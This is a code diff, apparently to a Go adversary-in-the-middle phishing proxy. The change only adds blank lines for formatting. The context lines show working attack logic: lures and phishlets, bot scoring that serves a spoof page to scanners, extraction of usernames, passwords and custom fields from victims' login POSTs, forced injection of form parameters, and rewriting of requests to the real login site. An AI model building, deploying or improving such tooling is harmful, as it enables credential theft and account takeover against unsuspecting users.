@@ -33,6 +33,7 @@ func (c *connection) serve(ctx context.Context) {
 			if !errors.Is(err, io.EOF) && !isConnReset(err) {
 				c.server.Logger.Debug("aitm: reading request", "error", err)
 			}
+
 			return
 		}
 
@@ -47,8 +48,10 @@ func (c *connection) serve(ctx context.Context) {
 			if sessionID == "" {
 				continue
 			}
+
 			rec := newHijackableResponseWriter(c.rawConn)
 			c.server.WSHub.HandleUpgrade(rec, req, sessionID)
+
 			return
 		}
 
@@ -57,9 +60,11 @@ func (c *connection) serve(ctx context.Context) {
 			rec := newBufferedResponseWriter(c.rawConn)
 			c.server.APIHandler.ServeHTTP(rec, req)
 			rec.flush()
+
 			if !rec.keepAlive {
 				return
 			}
+
 			continue
 		}
 
@@ -87,6 +92,7 @@ func (c *connection) handleRequest(r *http.Request) {
 				c.server.Logger.Error("connection setup failed", "error", err)
 				c.server.Spoof.ServeHTTP(w, r)
 			}
+
 			w.flush()
 			return
 		}
@@ -96,6 +102,7 @@ func (c *connection) handleRequest(r *http.Request) {
 	if c.session.IsDone() && c.lure != nil && c.lure.RedirectURL != "" {
 		http.Redirect(w, r, c.lure.RedirectURL, http.StatusFound)
 		w.flush()
+
 		return
 	}
 
@@ -104,12 +111,14 @@ func (c *connection) handleRequest(r *http.Request) {
 		if rule.ContentType != "" {
 			w.Header().Set("Content-Type", rule.ContentType)
 		}
+
 		w.WriteHeader(rule.StatusCode)
 		if rule.Body != "" {
 			if _, err := io.WriteString(w, rule.Body); err != nil {
 				c.server.Logger.Warn("failed to write intercept rule body", "error", err)
 			}
 		}
+
 		w.flush()
 		return
 	}
@@ -171,6 +180,7 @@ func (c *connection) initSession(firstReq *http.Request) error {
 		if c.botVerdict == aitm.VerdictSpoof {
 			return errSpoof
 		}
+
 		if c.botVerdict == aitm.VerdictBlock {
 			return errBlock
 		}
@@ -187,9 +197,11 @@ func (c *connection) initSession(firstReq *http.Request) error {
 	if err != nil {
 		return fmt.Errorf("resolving hostname %q: %w", hostname, err)
 	}
+
 	if phishlet == nil {
 		return errSpoof
 	}
+
 	c.phishlet = phishlet
 	c.lure = lure
 
@@ -200,6 +212,7 @@ func (c *connection) initSession(firstReq *http.Request) error {
 			c.isNewSession = false
 		}
 	}
+
 	if c.session == nil {
 		// New visitor — enforce lure rules before creating a session.
 		if lure == nil || lure.IsPaused() || !lure.MatchesUA(firstReq.UserAgent()) {
@@ -252,6 +265,7 @@ func (c *connection) rewriteLurePath(r *http.Request) {
 	if c.lure == nil || r.URL.Path != c.lure.Path {
 		return
 	}
+
 	landingPath := "/"
 	if c.phishlet.Login.Path != "" {
 		landingPath = c.phishlet.Login.Path
@@ -265,19 +279,23 @@ func (c *connection) shouldSpoof() bool {
 	if c.session == nil {
 		return false
 	}
+
 	// Once marked as a bot, always spoof.
 	if c.botVerdict == aitm.VerdictSpoof {
 		return true
 	}
+
 	if c.botVerdict != aitm.VerdictAllow {
 		return false
 	}
+
 	botScore := c.server.TelemetryScore.ScoreSession(c.session.ID)
 	c.session.BotScore = botScore
 	if botScore > c.server.ScoreThreshold {
 		c.botVerdict = aitm.VerdictSpoof
 		return true
 	}
+
 	return false
 }
 
@@ -288,6 +306,7 @@ func (c *connection) rewriteURL(r *http.Request) {
 		r.URL.Host = origin
 		r.URL.Scheme = ph.UpstreamScheme
 	}
+
 	rewriteHeader(r, "Origin", c.phishlet)
 	rewriteHeader(r, "Referer", c.phishlet)
 	stripCookie(r, SessionCookieName)
@@ -297,6 +316,7 @@ func (c *connection) extractCredentials(r *http.Request) {
 	if c.session == nil || r.Method != http.MethodPost {
 		return
 	}
+
 	login := c.phishlet.Login
 	if login.Domain != "" && !strings.HasSuffix(strings.ToLower(hostWithoutPort(r.Host)), strings.ToLower(login.Domain)) {
 		return
@@ -314,10 +334,12 @@ func (c *connection) extractCredentials(r *http.Request) {
 		c.session.Username = username
 		updated = true
 	}
+
 	if password := extractField(rules.Password, body); password != "" && c.session.Password == "" {
 		c.session.Password = password
 		updated = true
 	}
+
 	for _, customRule := range rules.Custom {
 		if value := extractField(customRule.CredentialRule, body); value != "" {
 			if c.session.Custom == nil {
@@ -345,18 +367,22 @@ func (c *connection) injectForcePost(r *http.Request) {
 	if r.Method != http.MethodPost {
 		return
 	}
+
 	for _, forcePost := range c.phishlet.ForcePosts {
 		if !forcePost.Path.MatchString(r.URL.Path) {
 			continue
 		}
+
 		body, err := readRequestBody(r)
 		if err != nil {
 			c.server.Logger.Error("failed to read request body for force_post", "path", r.URL.Path, "error", err)
 			continue
 		}
+
 		if !checkForcePostConditions(forcePost.Conditions, body) {
 			continue
 		}
+
 		modified := injectFormParams(body, forcePost.Params)
 		r.Body = io.NopCloser(bytes.NewReader(modified))
 		r.ContentLength = int64(len(modified))
@@ -378,5 +404,6 @@ func (c *connection) forwardRequest(req *http.Request) (*http.Response, error) {
 
 	// Tag with the original request so sub-filter hostname matching works.
 	resp.Request = req
+
 	return resp, nil
 }
